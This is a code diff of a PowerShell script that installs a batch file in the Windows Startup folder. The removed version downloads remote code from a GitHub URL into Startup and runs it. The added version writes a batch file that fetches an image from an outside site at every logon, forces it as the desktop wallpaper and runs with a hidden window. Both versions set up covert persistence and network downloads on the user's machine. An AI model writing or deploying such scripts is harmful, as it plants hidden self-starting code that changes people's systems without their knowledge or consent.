@@ -1,4 +1,19 @@
-(iwr "https://raw.githubusercontent.com/CRAFTIL/halva/72ca1aad41d5be8a7386d02710c2505800d85631/wallpaper.txt").Content |
-    Out-File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wallpaper.bat"
+$batchPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wallpaper.bat"
 
-Start-Process -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wallpaper.bat"
+$batchContent = @"
+@echo off
+set "IMG_PATH=%USERPROFILE%\cat_wallpaper.jpg"
+set "URL=https://az-market.net/tn_Cat_495623_3876.jpg"
+
+:: 1. Try to download the new image; if it fails, it just keeps the old one
+powershell -command "try { iwr '%URL%' -OutFile '%IMG_PATH%' } catch {}"
+
+:: 2. Set the wallpaper and force an immediate refresh (The '20, 0, path, 3' is the key)
+powershell -command "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int u, int p, string v, int f); }'; [W]::SystemParametersInfo(20, 0, '%IMG_PATH%', 3)"
+"@
+
+# Save the batch file to startup
+$batchContent | Out-File -FilePath $batchPath -Encoding ASCII
+
+# Run it immediately
+Start-Process "$batchPath" -WindowStyle Hidden
